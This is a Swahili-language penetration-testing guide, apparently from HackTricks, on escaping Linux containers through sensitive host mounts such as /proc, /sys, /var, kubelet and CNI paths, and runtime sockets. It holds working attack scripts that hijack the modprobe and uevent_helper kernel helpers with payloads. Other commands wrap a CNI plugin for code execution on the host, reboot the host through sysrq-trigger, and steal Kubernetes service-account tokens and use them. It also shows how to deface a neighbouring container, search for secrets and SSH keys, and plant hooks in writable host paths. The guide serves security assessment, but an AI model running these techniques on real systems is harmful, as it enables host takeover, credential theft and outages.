# Mounti Nyeti za Host

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Mounti za host ni mojawapo ya maeneo muhimu zaidi ya vitendo yanayoweza kutumiwa kutoroka kutoka kwenye container, kwa sababu mara nyingi hubatilisha utengaji makini wa mwonekano wa mchakato na kuufanya uone rasilimali za host moja kwa moja. Hali hatari si zile zinazohusu `/` pekee. Bind mounti za `/proc`, `/sys`, `/var`, soketi za runtime, hali inayodhibitiwa na kubelet, au njia zinazohusiana na vifaa zinaweza kufichua vidhibiti vya kernel, vitambulisho, mifumo ya faili ya containers jirani, na violesura vya usimamizi wa runtime.

Ukurasa huu umewekwa kando na kurasa mahususi za ulinzi kwa sababu modeli ya matumizi mabaya inahusu vipengele vingi. Mounti ya host inayoweza kuandikiwa ni hatari kwa sababu ya mount namespaces, user namespaces, kiwango cha ulinzi cha AppArmor au SELinux, na njia halisi ya host iliyofichuliwa. Kuichukulia kama mada yake yenyewe hurahisisha zaidi kutathmini eneo la mashambulizi.

Pia linganisha saraka ya host inayoweza kuandikiwa na njia inayolingana ndani ya kila container. Ikiwa imewekwa juu ya saraka ya script za uanzishaji zinazotekelezeka, mtumiaji wa host mwenye ruhusa za chini anaweza kuweka msimbo ambao entrypoint ya container yenye ruhusa za juu itapakia inapowashwa upya. Thibitisha chanzo na lengwa halisi la bind, ruhusa za kuandika/kutafuta za saraka, mzunguko wa entrypoint na hitaji la faili kutekelezeka, UID ya runtime, na kichochezi halisi cha kuwasha upya. UID 0 ya container haimaanishi moja kwa moja UID 0 ya host; ulinganishaji wa user namespace na sera ya mount huamua athari kwenye host. Ukaguzi usiofanya mabadiliko unapaswa kuripoti njia na ruhusa bila kuandika script au kuwasha upya workload.

Container ya Linux inaweza kuwa ndani ya VM ya usimamizi inayoshiriki sehemu ya mfumo wa faili wa host tofauti ya Windows. [VirtualBox shared folders](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) ni njia mojawapo ya kufanya faili za host zionekane ndani ya guest, lakini root katika VM hiyo bado ni utambulisho tofauti na wa msimamizi wa Windows. Ikiwa share inafichua private key ya SSH ya mtumiaji inayoweza kusomwa, ichukulie kama kidokezo cha kitambulisho: thibitisha mount inayotoka kwa host, umiliki na ufikiaji wa key, akaunti inayolingana, na sera **halisi inayotumika** ya authorized-key ya seva ya Windows SSH kabla ya kuhitimisha kuwa inaruhusu kuingia kwenye host. [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) ya kisasa hutumia mara nyingi faili tofauti ya `administrators_authorized_keys` kwa akaunti za wasimamizi. Usijumuishe maudhui ya private key kwenye matokeo ya kawaida ya upelelezi; metadata ya mount na njia ya key zinatosha kwa tathmini ya awali isiyofanya mabadiliko.

## Ufichuaji wa `/proc`

procfs ina taarifa za kawaida za michakato na violesura vya udhibiti wa kernel vyenye athari kubwa. Kwa hiyo, bind mount kama `-v /proc:/host/proc` au mwonekano wa container unaofichua maingizo ya proc yanayoweza kuandikiwa bila kutarajiwa unaweza kusababisha kufichuliwa kwa taarifa, kunyimwa huduma, au kutekeleza msimbo moja kwa moja kwenye host.

Njia za procfs zenye thamani kubwa ni pamoja na:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (hasa `register` na `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Matumizi Mabaya

Anza kwa kukagua ni maingizo yapi ya procfs yenye thamani kubwa yanaonekana au yanaweza kuandikiwa:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Njia hizi zinavutia kwa sababu tofauti. `core_pattern`, `modprobe`, na `binfmt_misc` zinaweza kuwa njia za kutekeleza msimbo kwenye host zikiwa zinaweza kuandikwa. `kallsyms`, `kmsg`, `kcore`, na `config.gz` ni vyanzo muhimu vya uchunguzi wa awali kwa ajili ya kutumia udhaifu wa kernel. `sched_debug` na `mountinfo` hufichua muktadha wa michakato, cgroup, na mfumo wa faili ambao unaweza kusaidia kuunda upya mpangilio wa host kutoka ndani ya container.

Thamani ya kiutendaji ya kila njia ni tofauti, na kuzichukulia zote kana kwamba zina athari sawa hufanya triage kuwa ngumu zaidi:

- `/proc/sys/kernel/core_pattern`
  Ikiwa inaweza kuandikwa, hii ni mojawapo ya njia zenye athari kubwa zaidi za procfs kwa sababu kernel itaendesha pipe handler baada ya crash. Container inayoweza kuelekeza `core_pattern` kwenye payload iliyohifadhiwa kwenye overlay yake au kwenye njia iliyomountiwa kutoka host mara nyingi inaweza kupata utekelezaji wa msimbo kwenye host. Tazama pia [read-only-paths.md](protections/read-only-paths.md) kwa mfano maalum.
- `/proc/sys/kernel/modprobe`
  Njia hii hudhibiti helper ya userspace ambayo kernel hutumia inapohitaji kuanzisha mantiki ya kupakia module. Ikiwa inaweza kuandikwa kutoka ndani ya container na kutafsiriwa katika muktadha wa host, inaweza kuwa njia nyingine ya kutekeleza msimbo kwenye host. Inavutia hasa ikiunganishwa na njia ya kuanzisha helper hiyo.
- `/proc/sys/vm/panic_on_oom`
  Hii kwa kawaida si njia rahisi ya kutoroka, lakini inaweza kugeuza shinikizo la kumbukumbu kuwa denial of service inayoathiri host nzima kwa kubadilisha hali za OOM kuwa tabia ya kernel panic.
- `/proc/sys/fs/binfmt_misc`
  Ikiwa kiolesura cha usajili kinaweza kuandikwa, mshambuliaji anaweza kusajili handler ya magic value aliyochagua na kupata utekelezaji katika muktadha wa host faili inayolingana inapoendeshwa.
- `/proc/config.gz`
  Ni muhimu kwa triage ya udhaifu wa kernel. Husaidia kubaini ni subsystems, mitigations, na vipengele vya hiari vya kernel vimewezeshwa bila kuhitaji metadata ya package za host.
- `/proc/sysrq-trigger`
  Kwa kiasi kikubwa ni njia ya denial of service, lakini ni mbaya sana. Inaweza kuwasha upya, kusababisha panic, au kuvuruga host mara moja kwa njia nyingine.
- `/proc/kmsg`
  Hufichua ujumbe wa kernel ring buffer. Ni muhimu kwa fingerprinting ya host, uchanganuzi wa crash, na katika baadhi ya mazingira kwa kuvuja kwa taarifa zinazosaidia kutumia udhaifu wa kernel.
- `/proc/kallsyms`
  Ni muhimu inapoweza kusomwa kwa sababu hufichua taarifa za alama za kernel zilizohamishwa nje na inaweza kusaidia kushinda dhana za address randomization wakati wa kuunda exploit ya kernel.
- `/proc/[pid]/mem`
  Hii ni kiolesura cha moja kwa moja cha kumbukumbu ya mchakato. Ikiwa mchakato lengwa unaweza kufikiwa kwa masharti yanayohitajika ya aina ya ptrace, huenda ikawezesha kusoma au kurekebisha kumbukumbu ya mchakato mwingine. Athari halisi hutegemea sana credentials, `hidepid`, Yama, na vizuizi vya ptrace, kwa hiyo ni njia yenye nguvu lakini yenye masharti.
- `/proc/kcore`
  Hufichua mwonekano wa kumbukumbu ya mfumo unaofanana na picha ya core. Faili hii ni kubwa na si rahisi kuitumia, lakini ikiwa inaweza kusomwa kwa kiwango cha maana, inaashiria kuwa uso wa kumbukumbu ya host umefichuliwa vibaya.
- `/dev/kmem` na `/dev/mem`
  Hivi ni violesura vya **device** vya kumbukumbu ghafi vyenye athari kubwa kihistoria, si faili za procfs. Katika mifumo mingi ya kisasa havipo au vimewekewa vizuizi vikali, lakini container inayoweza kufungua nakala iliyomountiwa kutoka host inapaswa kuchukulia ufichuzi huo kuwa muhimu sana. Vikague pamoja na mount nyingine nyeti za `/dev` badala ya kutafuta njia za `/proc/kmem` au `/proc/mem` ambazo hazipo.
- `/proc/sched_debug`
  Leaks taarifa za scheduling na task ambazo zinaweza kufichua utambulisho wa michakato ya host hata wakati mwonekano mwingine wa michakato unaonekana kuwa safi kuliko ilivyotarajiwa.
- `/proc/[pid]/mountinfo`
  Ni muhimu sana kwa kuunda upya mahali ambapo container ipo hasa kwenye host, ni njia zipi zina backing ya overlay, na kama mount inayoweza kuandikwa inalingana na maudhui ya host au safu ya container pekee.

Ikiwa `/proc/[pid]/mountinfo` au maelezo ya overlay yanaweza kusomwa, yatumie kupata njia ya host ya mfumo wa faili wa container:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Amri hizi ni muhimu kwa sababu mbinu kadhaa za kutekeleza msimbo kwenye host zinahitaji kubadilisha njia iliyo ndani ya container kuwa njia inayolingana kwa mtazamo wa host.

### Mfano: Kuandaa Njia ya Kisaidizi ya `modprobe`

Ikiwa `/proc/sys/kernel/modprobe` inaweza kuandikwa kutoka kwenye container na njia ya kisaidizi inafasiriwa katika muktadha wa host, inaweza kuelekezwa kwenye payload inayodhibitiwa na mshambulizi. Saraka ya upper ya overlay lazima itatuliwe kwa mtazamo wa host, na matokeo ya uthibitisho yaandikwe tena kwenye layer hiyo hiyo ya container inayoonekana na host ikiwa container haijaweka pia host `/tmp`:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

Kichochezi halisi hutegemea lengo na tabia ya kernel, na hakikadiriwi kimakusudi. Rejesha thamani ya awali kabla ya kuondoka kwenye maabara. Jambo muhimu ni kwamba njia saidizi inayoweza kuandikiwa inaweza kuelekeza mwito wa baadaye wa kernel helper kwenye maudhui ya njia ya host yanayodhibitiwa na mshambulizi. Kukosekana kwa `upperdir` ya overlay, njia ambayo host haiwezi kutatua, mount ya sysctl ya kusomeka tu, au kernel ambayo haiiti helper iliyochaguliwa huvunja mnyororo huu.

### Mfano Kamili: Kernel Recon Kwa Kutumia `kallsyms`, `kmsg` Na `config.gz`

Ikiwa lengo ni kutathmini uwezekano wa exploit badala ya kutoroka mara moja:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Amri hizi husaidia kubaini ikiwa taarifa muhimu za alama zinapatikana, ikiwa ujumbe wa hivi karibuni wa kernel unaonyesha hali ya kuvutia, na ni vipengele au hatua gani za kernel za kupunguza hatari zimejumuishwa wakati wa uundaji. Athari kwa kawaida si kutoroka moja kwa moja, lakini zinaweza kupunguza sana muda wa kuchunguza udhaifu wa kernel.

### Mfano Kamili: SysRq Host Reboot

Ikiwa `/proc/sysrq-trigger` inaweza kuandikwa na inaelekeza kwenye mwonekano wa host:

```bash
echo b > /proc/sysrq-trigger
```

Athari yake ni kuwasha upya host mara moja. Huu si mfano wa athari fiche, lakini unaonyesha wazi kwamba ufikiaji wa procfs unaweza kuwa na madhara makubwa zaidi kuliko kufichua taarifa.

## Ufikiaji wa `/sys`

sysfs hufichua kiasi kikubwa cha hali ya kernel na vifaa. Baadhi ya njia za sysfs husaidia hasa kwa fingerprinting, huku nyingine zikiathiri utekelezaji wa helper, tabia ya kifaa, usanidi wa security-module au hali ya firmware.

Njia muhimu za sysfs ni pamoja na:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Njia hizi ni muhimu kwa sababu tofauti. `/sys/class/thermal` inaweza kuathiri tabia ya usimamizi wa joto na hivyo uthabiti wa host katika mazingira yenye ufikiaji usiodhibitiwa vizuri. `/sys/kernel/vmcoreinfo` inaweza kuvuja taarifa za crash-dump na mpangilio wa kernel zinazosaidia kufanya fingerprinting ya host katika kiwango cha chini. `/sys/kernel/security` ni kiolesura cha `securityfs` kinachotumiwa na Linux Security Modules, kwa hiyo ufikiaji usiotarajiwa hapo unaweza kufichua au kubadilisha hali inayohusiana na MAC. Njia za vigezo vya EFI zinaweza kuathiri mipangilio ya kuwasha mfumo inayohifadhiwa kwenye firmware, jambo linalozifanya kuwa hatari zaidi kuliko faili za kawaida za usanidi. `debugfs` iliyo chini ya `/sys/kernel/debug` ni hatari hasa kwa sababu imekusudiwa kuwa kiolesura cha watengenezaji, chenye matarajio machache zaidi ya usalama kuliko API za kernel zilizoundwa kwa mifumo ya uzalishaji iliyoimarishwa.

Kila ingizo la sysfs katika orodha hii hutegemea **kernel, usanidi na maunzi**. Nodes za sasa katika mazingira ya virtualized mara nyingi hazina kabisa `uevent_helper`, vigezo vya EFI na maingizo ya vifaa vya joto. Rekodi njia ambayo haipo kama sharti la awali lisilokuwepo, badala ya kudhani kwamba mfano kutoka kernel nyingine unatumika.

Amri muhimu za kukagua njia hizi ni:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

Kinachofanya amri hizo zivutie:

- `/sys/kernel/security` inaweza kufichua kama AppArmor, SELinux, au LSM nyingine inaonekana kwa namna ambayo ilipaswa kubaki kwenye host pekee.
- `/sys/kernel/debug` mara nyingi ndilo jambo la kutia wasiwasi zaidi katika kundi hili. Ikiwa `debugfs` imewekwa na inasomeka au kuandikika, tarajia kuwepo kwa eneo pana linaloelekea kwenye kernel, ambalo hatari yake halisi hutegemea nodi za utatuzi zilizowezeshwa.
- Kufichuka kwa vigezo vya EFI si jambo la kawaida sana, lakini likitokea kuna athari kubwa kwa sababu kunahusu mipangilio inayohifadhiwa kwenye firmware, badala ya faili za kawaida za runtime.
- `/sys/class/thermal` inahusu zaidi uthabiti wa host na mwingiliano na hardware, si njia rahisi ya kutoroka kwa mtindo wa shell.
- `/sys/kernel/vmcoreinfo` hutumika hasa kutambua alama za host na kuchanganua crash, na husaidia kuelewa hali ya chini kabisa ya kernel.

### Mfano Kamili: `uevent_helper`

`/sys/kernel/uevent_helper` hutegemea kernel na usanidi, na haipo kwenye mifumo mingi ya sasa. Ikiwa ipo, inaweza kuandikika, na kichochezi cha `uevent` kinachoweza kutumika kinapatikana, kernel inaweza kutekeleza helper inayodhibitiwa na mshambuliaji. Matokeo ya uthibitisho lazima yatumie njia inayoonekana kutoka kwenye mitazamo ya host na container:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

Sababu inayofanya hili lifanye kazi ni kwamba njia ya helper hutafsiriwa kwa mtazamo wa host. Linapoanzishwa, helper huendeshwa katika muktadha wa host badala ya ndani ya container ya sasa. `/sys/class/mem/null/uevent` ni kichochezi kimoja mahususi kwenye kernels zinazokionyesha; vifaa vingine vinaweza kuwa na faili zao za `uevent`, lakini usichague moja bila kufikiria kwenye hardware halisi. Rejesha thamani ya awali kabla ya kuondoka kwenye lab. Usiripoti mbinu hii kuwa inapatikana ikiwa faili ya helper au kichochezi kinachodhibitiwa hakipo.

## Uwekaji wazi wa `/var`

Kumount `/var` ya host ndani ya container mara nyingi hudharauliwa kwa sababu haionekani kuwa kubwa kama kumount `/`. Kwa vitendo, huenda ikatosha kufikia runtime sockets, saraka za snapshot za container, pod volumes zinazosimamiwa na kubelet, tokeni za service-account zilizoprojectiwa, na mifumo ya faili ya programu zilizo karibu. Kwenye nodes za kisasa, `/var` mara nyingi ndiko kunakopatikana sehemu kubwa ya hali ya container yenye umuhimu wa kiutendaji.

### Mfano wa Kubernetes

Pod yenye `hostPath: /var` mara nyingi inaweza kusoma tokeni zilizoprojectiwa za pods nyingine na maudhui ya overlay snapshot:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Amri hizi zinafaa kwa sababu zinaonyesha kama mount inafichua data ya programu isiyo muhimu tu au credentials za cluster zenye athari kubwa. Token ya service-account inayoweza kusomwa inaweza kubadilisha local code execution mara moja kuwa ufikiaji wa Kubernetes API.

Ikiwa token ipo, hakikisha inachoweza kufikia badala ya kusimama baada ya kugundua token:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

Athari hapa inaweza kuwa kubwa zaidi kuliko ufikiaji wa node ya ndani. Tokeni yenye RBAC pana inaweza kugeuza `/var` iliyomountiwa kuwa njia ya kuhatarisha cluster nzima.

### Mfano wa Docker na containerd

Kwenye host za Docker, data husika mara nyingi huwa chini ya `/var/lib/docker`, ilhali kwenye node za Kubernetes zinazotumia containerd inaweza kuwa chini ya `/var/lib/containerd` au njia mahususi za snapshotter:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

Ikiwa `/var` iliyowekwa mount inaonyesha maudhui ya snapshot ya workload nyingine yanayoweza kuandikwa, mshambuliaji anaweza kubadilisha faili za programu, kuweka maudhui ya wavuti, au kubadilisha startup scripts bila kugusa usanidi wa container ya sasa.

Kwenye workload ya maabara inayoweza kutupwa, maudhui ya snapshot yanayoweza kuandikwa yanaweza kuonyesha jinsi ya kuchezea programu, kurejesha siri, au kufanya lateral movement. Kwanza linganisha ID ya container inayoendeshwa na snapshot husika, na usihariri kamwe snapshot isiyohusika au ya production:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Amri hizi ni muhimu kwa sababu zinaonyesha makundi matatu makuu ya athari za `/var` iliyowekwa mount: kuchezea programu, kurejesha siri, na kusonga kando hadi kwenye workloads jirani.

Kuandika moja kwa moja kwenye snapshot hupita usimamizi wa kawaida wa hali ya runtime na kunaweza kuharibu container au kuangamiza ushahidi. Ugunduzi wa kusoma pekee ulijaribiwa upya ndani ya mazingira ya ndani dhidi ya Docker `overlay2`: marker iliyoandikwa kwenye container jirani ya muda ilionekana chini ya `/var/lib/docker/overlay2/<id>/diff/`. Fanya marekebisho halisi ya snapshot kwenye container ya muda iliyoundwa kwa ajili ya jaribio hilo pekee.

## Hali ya Kubelet, Plugins, na Njia za CNI

Mount ya `/var/lib/kubelet`, `/opt/cni/bin`, au `/etc/cni/net.d` mara nyingi hupatikana kupitia DaemonSets zenye ruhusa za juu, mawakala wa CNI, plugins za CSI node, waendeshaji wa GPU, na wasaidizi wa storage. Ni rahisi kupuuza mount hizi kama "miundombinu ya node", lakini ziko moja kwa moja kwenye njia ya utekelezaji wa pods mpya na mara nyingi huwa na credentials za kubelet, secrets zilizoprojectiwa, registration sockets, na binaries zinazoweza kutekelezwa za plugins zilizo upande wa host.

Malengo yenye thamani kubwa ni pamoja na:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Amri muhimu za ukaguzi ni:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Kwa nini njia hizi ni muhimu:

- `/var/lib/kubelet/pki` inaweza kufichua vyeti vya mteja vya kubelet na vitambulisho vingine vya ndani ya node ambavyo wakati mwingine vinaweza kutumiwa tena dhidi ya API server au endpoints za TLS zinazowasiliana na kubelet, kutegemea usanifu wa cluster.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` mara nyingi huwa na tokeni za service-account zilizowekwa na Secrets zilizowekwa kwa pods zilizo karibu kwenye node hiyo hiyo.
- `/var/lib/kubelet/pod-resources/kubelet.sock` kimsingi ni sehemu ya upelelezi, lakini yenye manufaa makubwa: hufichua ni pods na containers zipi kwa sasa zinamiliki GPUs, hugepages, vifaa vya SR-IOV na rasilimali nyingine adimu za ndani ya node.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, na `/var/lib/kubelet/plugins_registry` hufichua ni device plugins zipi za CSI, DRA na nyinginezo zilizosakinishwa, na ni sockets zipi ambazo kubelet inatarajiwa kuwasiliana nazo. Ikiwa saraka hizo zina ruhusa ya kuandikika badala ya kusomeka tu, hali huwa mbaya zaidi.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` na `/etc/cni/net.d` ziko moja kwa moja kwenye njia ya usanidi wa mtandao wa pod. Ruhusa ya kuandika humo mara nyingi ni njia ya kupata utekelezaji kwenye host baadaye, badala ya kufichua usanidi tu.<sup>[[2]](#references)</sup>

### Mfano Kamili: `/opt/cni/bin` Inayoweza Kuandikika

Ikiwa saraka ya binary za CNI ya host imewekwa kwa ruhusa ya kusoma na kuandika, kubadilisha plugin kunaweza kutosha kupata utekelezaji kwenye host mara nyingine kubelet itakapounda pod sandbox kwenye node hiyo:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Hili si la haraka kama `docker.sock` iliyomountiwa, lakini mara nyingi ni hali inayowezekana zaidi kwenye infrastructure pods za Kubernetes zilizoathiriwa. Alama huandikwa kando ya plugin iliyomountiwa ili container iweze kuipata hata bila mount ya host-root au host-`/tmp`. Wrapper huhifadhi arguments asili na standard input, kisha mfano hurejesha binary asili. Jambo muhimu ni kwamba binary iliyorekebishwa hutekelezwa baadaye na mtiririko wa usanidi wa mtandao wa host, si na container ya sasa. Tumia node ya majaribio tu, kwa sababu wrapper isiyo sahihi inaweza kuzuia Pod sandboxes mpya kupata networking.

## Soketi za Runtime

Mounts nyeti za host mara nyingi huwa na soketi za runtime badala ya directories nzima. Hizi ni muhimu sana kiasi kwamba zinastahili kutajwa tena waziwazi hapa:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Tazama [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) kwa mtiririko kamili wa exploitation pindi mojawapo ya socket hizi inapowekwa mount.

Kama muundo wa haraka wa mwingiliano wa kwanza:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

Ikiwa mojawapo ya hizi itafaulu, njia kutoka kwenye "mounted socket" hadi "kuanzisha sibling container yenye ruhusa za juu zaidi" kwa kawaida huwa fupi zaidi kuliko njia yoyote ya kernel breakout.

Ufikiaji huohuo wa daemon unaweza pia kuwezesha **host persistence**. Helper container yenye writable host-root bind mount inaweza kupokea faili kupitia `docker cp`, kisha kutumia `docker exec` kuweka SSH key, service unit, au faili nyingine ya persistence chini ya njia ya host iliyomountiwa. Mpaka wa usalama ni mamlaka ya daemon ya kuunda host mount; `docker cp` ni hatua ya kuweka faili tu. Kagua containers zilizoundwa hivi karibuni na maandishi kwenye njia za uthibitishaji au za kuanzisha za host baada ya runtime socket kufichuliwa.

## Writable Host Path Task Hijack

Host mount inayoweza kuandikwa si lazima ifichue `/` ili iwe hatari. Ikiwa njia iliyomountiwa ina scripts, config files, hooks, plugins, au faili zinazotumiwa baadaye na scheduled task au service ya upande wa host, container inaweza kubadilisha kinachoendeshwa na host.

Mtiririko wa jumla wa ukaguzi:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

Ikiwa faili inayoweza kuandikwa inatumiwa na mchakato wa host, weka payload rahisi na inayoonekana wakati wa kujaribu:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

Sehemu ya kuvutia ni mpaka wa uaminifu: uandishi hufanyika kutoka ndani ya container, lakini utekelezaji hufanyika baadaye katika muktadha wa huduma ya host. Hii hugeuza hostPath au bind mount yenye wigo finyu kuwa njia ya kuchelewesha utekelezaji wa code kwenye host.

## Faili Zinazomilikiwa na Root kwenye Njia ya Host Inayotumiwa Pamoja

Akaunti ya container inayoweza kupata root huenda ikaweza kuweka faili inayomilikiwa na root kwenye njia inayoweza kuandikika na inayotumiwa pia na host. Ikiwa UID 0 ya container inapangwa kuwa UID 0 ya host, mitazamo yote miwili hurejelea faili ileile, na mount ya host inaruhusu utekelezaji wa SUID, mtumiaji wa host anayeweza kuendesha executable ya SUID inayomilikiwa na root kwenye njia hiyo huenda akavuka mpaka wa ruhusa za host. Container haihitaji kuendeshwa kwa `--privileged` ili tatizo hili mahususi la umiliki wa faili liwezekane. Angalia [user namespace mappings](protections/namespaces/user-namespace.md) na [majadiliano ya SUID](privileged-containers.md) kwa masharti mengine tofauti.

Kagua njia kutoka **pande zote mbili**: linganisha umiliki na utambulisho wa faili isiyo hatari, kagua `uid_map` na `gid_map` za container, na uchunguze chaguo za mount na sera ya utekelezaji za host. `rw` upande wa container bila `nosuid` ni kidokezo tu; hakithibitishi umiliki upande wa host, alama za mount za host, ufikiaji wa mtumiaji wa host, au kama AppArmor/SELinux inazuia utekelezaji. `noexec` huzuia utekelezaji katika mtazamo ambamo inatumika. Lebo za `shared:` na `master:` katika `/proc/self/mountinfo` hueleza uenezaji wa mount, wala si kama maudhui ya faili yanashirikiwa na host. Bind mount huenda isiwe na lebo hizo. Kutumia tena kitambulisho cha kuingia kinachowezesha kuingia kwenye host ni hatua tofauti na kuvuka mpaka wa ruhusa kupitia faili inayoshirikiwa.

Hifadhi ya runtime ya host inaweza kuunda njia inayofanana hata bila bind mount iliyo wazi. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) ilimwezesha mtumiaji wa host asiye na ruhusa kupitia subdirectory za data za Docker na kutekeleza faili kutoka kwenye filesystem ya container; Moby ilirekebisha ruhusa katika toleo la 20.10.9 na kubainisha kuwa containers zinazoendeshwa lazima zianzishwe upya ili kurekebisha directories zake. Kagua njia halisi za `overlay2/<id>/merged` zilizowekwa mount na ruhusa ya utafutaji ya kila directory ya mzazi, kisha thibitisha kama UID 0 ya container inapangwa kuwa UID 0 ya host, kama executable halisi ya SetUID inayomilikiwa na root ipo na inaweza kufikiwa, na kama mtazamo wa host unaruhusu utekelezaji wa SetUID. Containers za rootless au zilizopangwa upya kwa user namespace, `nosuid`, `noexec`, `no_new_privs`, na sera ya MAC zinaweza kubadilisha matokeo. Toleo la runtime au njia inayoweza kupitiwa pekee ni kidokezo cha uchunguzi, si uthibitisho wa utekelezaji wa code kama root kwenye host; kagua metadata ya mount na faili bila kuendesha executable 